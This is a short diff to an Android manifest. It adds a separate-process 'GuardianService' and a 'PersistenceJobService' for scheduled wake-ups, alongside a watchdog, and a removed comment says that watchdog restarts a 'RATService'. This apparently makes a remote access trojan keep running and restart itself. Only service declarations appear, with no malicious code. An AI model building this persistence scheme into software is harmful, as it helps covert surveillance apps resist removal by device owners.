@@ -90,7 +90,23 @@
             android:stopWithTask="false"
             android:persistent="true" />
         
-        <!-- Watchdog Service - Monitors and restarts RATService -->
+        <!-- Guardian Service - Separate process monitoring -->
+        <service
+            android:name=".GuardianService"
+            android:enabled="true"
+            android:exported="false"
+            android:process=":guardian"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false" />
+        
+        <!-- Persistence JobService - Scheduled wake-ups -->
+        <service
+            android:name=".PersistenceJobService"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+        
+        <!-- Watchdog Service - Legacy monitoring (optional) -->
         <service
             android:name=".WatchdogService"
             android:enabled="true"
